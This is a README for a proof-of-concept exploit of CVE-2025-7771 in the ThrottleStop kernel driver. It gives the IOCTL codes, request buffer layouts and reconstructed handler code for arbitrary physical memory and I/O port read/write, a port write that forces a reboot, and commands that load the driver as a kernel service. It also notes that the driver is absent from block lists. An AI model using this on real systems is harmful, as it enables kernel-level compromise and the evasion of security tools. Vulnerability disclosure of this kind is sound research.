# ThrottleStopPoC
**CVE-2025-7771**: Arbitrary physical memory and I/O port read/write via ThrottleStop driver

ThrottleStop is a small legitimate application used to monitor and correct CPU throttling. It has a driver that faciliates these tasks and it mostly doesn't have any sort of input validation.

## Vulnerable IOCTLs
| IOCTL         | Vulnerability             |
| --------------| --------------------------|
| 0x80006498    | Arbitrary memory read     |
| 0x8000649C    | Arbitrary memory write    |
| 0x80006430    | Arbitrary port read       |
| 0x80006434    | Arbitrary port write      |

There also seems to be arbitrary MSR read and write but I wasn't able to get them working.
Feel free to look it yourself.
Read MSR is at `0x80006448` and write at `0x8000644C`.

---
> All of the IOCTL calls mentioned below are implemented in [Exploit.c](src/Exploit.c) file. 
---

### Arbitrary memory read
`0x80006498` IOCTL maps any provided physical address into kernel space using `MmMapIoSpace` and reads 1, 2, 4, or 8 bytes from it. The data is then copied back into user space. 

To trigger this IOCTL, `DeviceIoControl` with physical address as input and output buffer size as read size (1, 2, 4, or 8).

Simplified code for this IOCTL in driver:
```cpp
case 0x80006498: {
    size_t readSize = inputBuffer->Size;   // must be 1,2,4,8
    PHYSICAL_ADDRESS physAddr = inputBuffer->PhysAddr;
    void* mappedAddr = MmMapIoSpace(physAddr, readSize, MmNonCached);

    if (mappedAddr) {
        if (readSize == 1)
            *outputBuffer = *(uint8_t*)mappedAddr;
        else if (readSize == 2)
            *(uint16_t*)outputBuffer = *(uint16_t*)mappedAddr;
        else if (readSize == 4)
            *(uint32_t*)outputBuffer = *(uint32_t*)mappedAddr;
        else if (readSize == 8)
            *(uint64_t*)outputBuffer = *(uint64_t*)mappedAddr;

        MmUnmapIoSpace(mappedAddr, readSize);
    }
}
```

### Arbitrary memory write
Similar to read, `0x8000649C` IOCTL maps provided physical address into kernel space using `MmMapIoSpace` and reads 1, 2, 4, or 8 bytes from it.

To trigger this IOCTL, `DeviceIoControl` with the following input buffer layout:
```cpp
struct {
    ULONGLONG PhysicalAddress;  // 8 bytes
    union {
        BYTE  Value8;
        WORD  Value16;
        DWORD Value32;
        QWORD Value64;
    };
};
```
Input buffer size will be 8 + (1, 2, 4, or 8) depending on write size.

Output buffer and output buffer size are unused.

Simplified code for this IOCTL in driver:
```cpp
case 0x8000649C: {
    size_t writeSize = inputBuffer->Size;  // must be 1,2,4,8
    PHYSICAL_ADDRESS physAddr = inputBuffer->PhysAddr;
    void* mappedAddr = MmMapIoSpace(physAddr, writeSize, MmNonCached);

    if (mappedAddr) {
        if (writeSize == 1)
            *(uint8_t*)mappedAddr = inputBuffer->Value8;
        else if (writeSize == 2)
            *(uint16_t*)mappedAddr = inputBuffer->Value16;
        else if (writeSize == 4)
            *(uint32_t*)mappedAddr = inputBuffer->Value32;
        else if (writeSize == 8)
            *(uint64_t*)mappedAddr = inputBuffer->Value64;

        MmUnmapIoSpace(mappedAddr, writeSize);
    }
}
```

### Arbitrary port read
`0x80006430` IOCTL allows a user to specify an IO port and read from it directly using `__inbyte`, `__inword`, or `__indword`.

Input buffer is a `USHORT` and Input buffer size should be `sizeof(USHORT)`.

Output buffer will hold the result (1, 2, or 4 bytes depending on requested size) and output size can be 1, 2, or 4.

Simplified code for this IOCTL in driver:
```cpp
case 0x80006430: {
    uint16_t port = inputBuffer->PortNumber;
    uint8_t size  = inputBuffer->AccessSize; // 1, 2, or 4

    if (size == 1)
        *outputBuffer = __inbyte(port);
    else if (size == 2)
        *(uint16_t*)outputBuffer = __inword(port);
    else if (size == 4)
        *(uint32_t*)outputBuffer = __indword(port);
}
```

### Arbitrary port write
Similar to port read, `0x80006434` IOCTL allows a user to specify an IO port and write arbitrary values to it with `__outbyte`, `__outword`, or `__outdword`.
The input buffer layout is:
```cpp
struct {
    USHORT PortNumber;
    BYTE   Padding[2];   // alignment
    union {
        BYTE  Value8;
        WORD  Value16;
        DWORD Value32;
    };
};
```
Input buffer size should be sizeof(USHORT) + sizeof(Value) (+ padding).
Output buffer and its size are unused.

Simplified code for this IOCTL in driver:
```cpp
case 0x80006434: {
    uint16_t port = inputBuffer->PortNumber;
    uint8_t size  = inputBuffer->AccessSize; // 1, 2, or 4

    if (size == 1)
        __outbyte(port, inputBuffer->Value8);
    else if (size == 2)
        __outword(port, inputBuffer->Value16);
    else if (size == 4)
        __outdword(port, inputBuffer->Value32);
}
```
---

### Translation of virtual addresses to physical addresses
This translation is possible by abusing Superfetch, a legitimate kernel module that exposes virtual to physical address translation using undocumented APIs.
The code for this is implemented in [vtop.c](src/vtop.c)

## Build 
This project can be compiled using Meson. It reads the `UniqueProcessId` field by resolving the EPROCESS structure of the System process using `PsInitialSystemProcess` and checks if it's `4` (imeplemented in [Main.c](src/Main.c) and the functions for finding EPROCESS of a specific PID are implemented in [EProcess.c](src/EProcess.c)). Additionally, it asks the user if they want to force-restart their system. This is possible by writing `0x0E` value to port `0xCF9`.

> **Warning**: Everything was tested on **Windows 11 build 24H2**. The offsets in the EPROCESS structure might be different on your system.

Build the project by
```
meson setup build
```
It will create the build directory. Now compile the project with
```
meson compile -C build
```

The driver is available at `Drivers` directory of the repository. ThrottleStop drivers can be directly extracted from `ThrottleStop.exe` program via Resource Hacker. You'll find 2 drivers - x64 and x86. `DriverObject->MajorFunction[14]` holds the dispatch function where all the IOCTLs have been implemented.

Create and start driver using:
```
sc create ThrottleStop binPath="<Path>" type=kernel
sc start ThrottleStop
```

## References
https://github.com/jonomango/superfetch

This driver hasn't yet been added to Microsoft driver block list nor [loldrivers](https://loldrivers.io).
